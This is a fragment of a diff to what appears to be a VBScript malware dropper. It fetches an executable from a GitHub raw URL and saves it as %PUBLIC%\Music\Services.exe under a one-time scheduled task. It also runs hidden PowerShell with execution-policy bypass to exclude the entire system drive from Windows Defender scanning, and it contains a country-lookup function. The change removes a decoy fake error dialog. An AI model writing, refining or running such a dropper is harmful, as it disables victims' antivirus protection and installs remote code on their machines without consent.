@@ -30,8 +30,6 @@ url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/testing/Backgrou
 target = shell.ExpandEnvironmentStrings("%PUBLIC%\Music\Services.exe")
 runTask = "OneTimeRunfile"
 
-MsgBox "Unexpected error occured.", 64, "Error"
-
 excludeCmd = "$env:SystemDrive | ForEach-Object { Add-MpPreference -ExclusionPath $_ } >$null 2>&1"
 excludeRun = "powershell.exe -ExecutionPolicy Bypass -Command """ & excludeCmd & """"
 shell.Run excludeRun, 0, True
@@ -63,4 +61,5 @@ Function GetCountry(json)
         GetCountry = ""
     End If
 End Function
+
 
